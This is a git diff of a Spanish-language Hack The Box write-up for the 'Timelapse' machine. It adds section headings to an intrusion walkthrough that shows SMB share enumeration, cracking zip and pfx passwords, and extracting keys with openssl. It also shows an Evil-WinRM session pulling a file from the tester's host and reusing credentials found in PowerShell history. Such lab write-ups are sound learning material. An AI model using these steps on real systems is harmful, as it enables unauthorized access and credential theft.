@@ -1,8 +1,14 @@
-10.10.11.152 - Timelpase
-------------------------
+# 10.10.11.152 - Timelpase
+![Timelapse](https://user-images.githubusercontent.com/96772264/205365063-9ef89d8b-1b63-4087-9ae1-bdd579322a6a.png)
 
-Puertos: 53(dns),88(kerberos),135(rpc),139(ldap),445(smb),464,593,636,3269,3268,5986(winrm),9389
-- Nombre: timelapse.htb
+------------------------
+# Part 1: Enumeración
+
+Puertos: 53(dns),88(kerberos),135(rpc),139(ldap),445(smb),464,593,636,3269,3268,5986(winrm),9389:  
+- Nombre: timelapse.htb  
+
+------------------------
+# Part 2: Accediendo a smb
 
 ```console
 └─$ smbmap -H 10.10.11.152 -u 'test'
@@ -13,11 +19,6 @@ Puertos: 53(dns),88(kerberos),135(rpc),139(ldap),445(smb),464,593,636,3269,3268,
 	dr--r--r--                0 Mon Oct 25 17:55:14 2021	HelpDesk
 └─$ smbmap -H 10.10.11.152 -u 'test' -r "Shares/Dev"
 	fr--r--r--             2611 Mon Oct 25 23:05:30 2021	winrm_backup.zip
-└─$ smbmap -H 10.10.11.152 -u 'test' -r "Shares/HelpDesk"
-	fr--r--r--          1118208 Mon Oct 25 17:55:14 2021	LAPS.x64.msi
-	fr--r--r--           104422 Mon Oct 25 17:55:14 2021	LAPS_Datasheet.docx
-	fr--r--r--           641378 Mon Oct 25 17:55:14 2021	LAPS_OperationsGuide.docx
-	fr--r--r--            72683 Mon Oct 25 17:55:14 2021	LAPS_TechnicalSpecification.docx
 └─$ smbmap -H 10.10.11.152 -u 'test' --download "Shares/Dev/winrm_backup.zip"
 
 └─$ unzip 10.10.11.152-Shares_Dev_winrm_backup.zip
@@ -28,6 +29,10 @@ supremelegacy    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)
 └─$ unzip winrm_backup.zip
 [10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
 ```
+
+------------------------
+# Part 3: Crackenado archivos
+
 Los archivos pfx sirven para crear llaves con ellos.
 ```console
 └─$ openssl pkcs12 -in ./legacyy_dev_auth.pfx -nocerts -out llave_legacy.key
@@ -46,6 +51,9 @@ thuglegacy       (legacyy_dev_auth.pfx)
 *Evil-WinRM* PS C:\Users\legacyy\Documents> copy \\10.10.14.16\carpeta\enumeracion_windows.bat
 ```
 - Vemos que en el historial de comandos en Powershell hay creds svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
+
+------------------------
+# Part 4: Escalando privilegios: LAPS_READERS
 
 ```console
 └─$ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
